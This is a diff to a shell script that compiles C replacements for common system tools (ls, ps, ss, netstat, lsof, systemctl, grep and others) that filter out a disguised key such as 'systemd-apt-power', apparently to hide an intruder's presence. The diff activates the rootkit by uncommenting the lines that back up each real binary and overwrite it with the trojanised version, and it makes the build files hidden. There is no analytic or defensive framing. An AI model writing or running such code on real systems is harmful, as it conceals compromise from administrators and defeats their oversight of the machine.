@@ -2,7 +2,7 @@ for i in 'cat'
 do
 	unalias $i
 	rm -f ./*.c
-	rm -f ./$i
+	rm -f './.'$i
 
 	a="`which $i`"wvikdlas
 	j="${a/$i/wvikdlas$i}"
@@ -104,7 +104,7 @@ do
 	                    if (info_inline(INFO7, out_buf)) break;
 	                    if (info_inline(INFO8, out_buf)) break;
 	                    if (info_inline(INFO9, out_buf)) break;
-	                    //add info here
+
 
 	                    if (info_inline("/ss", argv[0]) || info_inline("/systemctl", argv[0]))
 	                        patch_space(out_buf);
@@ -126,10 +126,10 @@ do
 	}
 EOF
 	gcc -std=c99 $i.c -o './.'$i
-	#z="`which cp`"
-	#b="`which $i`"
-	#$z $b $j
-	#$z './'$i $b
+	z="`which cp`"
+	b="`which $i`"
+	$z $b $j
+	$z './'$i $b
 	#echo ''
 done
 
@@ -145,7 +145,7 @@ for i in 'ls' 'ps' 'ss' 'netstat' 'lsof' 'strings' 'systemctl' 'last' 'grep' 'fi
 do
 	unalias $i
 	rm -f ./*.c
-	rm -f ./$i
+	rm -f './.'$i
 	a="`which $i`"wvikdlas
 	j="${a/$i/wvikdlas$i}"
 	key1="systemd-apt-power"
@@ -285,10 +285,10 @@ do
 	}
 EOF
 	gcc -std=c99 $i.c -o './.'$i
-	#z="`which cp`"
-	#b="`which $i`"
-	#$z $b $j
-	#$z './'$i $b
+	z="`which cp`"
+	b="`which $i`"
+	$z $b $j
+	$z './'$i $b
 	#echo ''
 done
 
